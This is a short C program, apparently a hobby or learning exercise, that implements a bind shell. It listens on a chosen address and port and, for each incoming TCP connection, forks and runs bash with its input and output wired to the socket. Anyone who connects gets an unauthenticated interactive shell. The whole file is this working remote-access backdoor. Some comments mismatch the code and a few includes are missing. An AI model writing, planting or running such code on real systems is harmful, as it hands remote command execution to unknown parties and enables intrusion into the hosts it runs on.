#include <sys/socket.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>
#include <netinet/ip.h>
#include <signal.h>


#define PORT	80


/*
 * opens a connection to server, sends command to remote server and print
 */
/* 
 * server recieves a tcp connection request, spwas a bash process which reads and writes to 
 * the connectione end
 */


char *bash = "/usr/bin/bash";
char *args[] = {"/usr/bin/bash", NULL};

void createChild(int connFd)
{
	if(fork()>0)
	{
		return;
	}
	// duplicate stdin and stdout
	if(dup2(connFd, STDIN_FILENO) < 0)
	{
		perror("dup2()");
		exit(2);
	}
	if(dup2(connFd, STDOUT_FILENO) < 0)
	{
		perror("dup2()");
		exit(2);
	}
	if(dup2(connFd, STDERR_FILENO) < 0)
	{
		perror("dup2()");
		exit(2);
	}
	execvp(bash, args);
	perror("exec()");
	exit(1);
}

void sighandler(int signum)
{
	/*
 	* we need child pid to connection fd to properly
 	* close the connection, for let the timeout period takecare of it
 	*/

	printf("Recived SIGCHLD");
	pid_t pid;
	int status;
	pid = wait(&status);
	printf("Child pid %d exited with status %d\n", pid, status);
	
}
	

int main(int argc, char *argv[])
{

	struct sockaddr_in sockAddr;
	int sockFd, connFd, sts;

	if(argc != 3)
	{
		printf("Usage: %s <ipAddr> <portNum>\n", argv[0]);
		exit(1);
	}

	if(signal(SIGCHLD, sighandler) < 0)
	{
		perror("signal()");
		exit(2);
	}

	

	sockFd = socket(AF_INET, SOCK_STREAM, 0);
	if(sockFd < 0)
	{
		perror("socket()");
		exit(2);
	}
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_port = htons(atoi(argv[2]));
	inet_pton(AF_INET, argv[1], &sockAddr.sin_addr);
	
	if(bind(sockFd, (struct sockaddr *)&sockAddr, sizeof(sockAddr)) < 0)
	{
		perror("bind()");
		exit(2);
	}
	
	while(1)
	{
		sts = listen(sockFd, 100);
		if(sts < 0)
		{
			perror("listen()");
			exit(2);
		}
		connFd = accept(sockFd, NULL, 0);
		createChild(connFd);
	}
	
}

		
	
	 
